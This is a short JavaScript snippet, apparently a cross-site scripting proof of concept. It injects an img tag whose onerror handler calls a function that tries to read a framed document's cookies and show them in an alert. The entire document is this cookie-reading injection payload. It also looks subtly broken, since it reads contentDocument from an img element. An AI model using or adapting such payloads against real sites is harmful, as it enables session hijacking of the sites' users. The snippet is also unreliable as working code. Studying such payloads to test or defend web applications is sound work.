function bru() {
 var cookies = document.getElementById('f').contentDocument.cookie;
 alert(cookies);
};
document.write('<img id="f" onerror="bru()" src="/user/1234" >');
